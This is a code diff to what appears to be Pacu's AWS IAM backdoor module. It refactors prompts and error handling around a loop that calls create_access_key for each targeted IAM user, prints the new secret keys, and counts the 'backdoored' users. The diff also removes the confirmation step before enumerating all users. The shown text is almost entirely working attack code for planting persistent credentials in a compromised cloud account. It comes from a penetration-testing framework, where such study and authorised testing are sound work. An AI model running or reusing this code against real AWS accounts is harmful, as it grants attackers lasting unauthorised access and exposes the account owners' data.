@@ -40,6 +40,7 @@ def main(args, pacu_main):
     ###### Don't modify these. They can be removed if you are not using the function.
     args = parser.parse_args(args)
     print = pacu_main.print
+    input = pacu_main.input
     fetch_data = pacu_main.fetch_data
     ######
 
@@ -53,11 +54,6 @@ def main(args, pacu_main):
         else:
             usernames = [args.usernames]
     else:
-        enumerate_all = input('No user names were passed in as arguments, do you want to enumerate all users and get a prompt for each one (y) or exit (n)? ')
-        if enumerate_all.lower() == 'n':
-            print('Exiting...')
-            return
-
         if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
             print('Pre-req module not run successfully. Exiting...')
             return
@@ -67,22 +63,30 @@ def main(args, pacu_main):
 
     add_key = ''
     summary_data['Backdoored_Users_Count'] = 0
+    print('Add keypair users...')
     for username in usernames:
         if args.usernames is None:
-            add_key = input('  Do you want to add an access key pair to the user {} (y/n)? '.format(username))
-
+            add_key = input('  {} (y/n)? '.format(username))
+        else:
+            print('  {}'.format(username))
         if add_key == 'y' or args.usernames is not None:
             try:
-                response = client.create_access_key(
-                    UserName=username
-                )
-                print('    Access Key ID: {}\n'.format(response['AccessKey']['AccessKeyId']))
-                print('    Secret Access Key: {}\n'.format(response['AccessKey']['SecretAccessKey']))
+                response = client.create_access_key(UserName=username)
+                print('    Key ID: {}'.format(response['AccessKey']['AccessKeyId']))
+                print('    Secret Key: {}'.format(response['AccessKey']['SecretAccessKey']))
 
                 summary_data['Backdoored_Users_Count'] += 1
 
-            except ClientError as e:
-                print('    Error: {}\n'.format(e.response['Error']['Message']))
+            except ClientError as error:
+                code = error.response['Error']['Code']
+                if code == 'AccessDenied':
+                    print('    FAILURE: ')
+                    print('      MISSING NEEDED PERMISSIONS')
+                else:
+                    print('    FAILURE: ')
+                    print('      UNKNOWN:')
+                    print('        {}'.format(error.response['Error']['Code']))
+                    return
 
     print('{} completed.\n'.format(module_info['name']))
     return summary_data
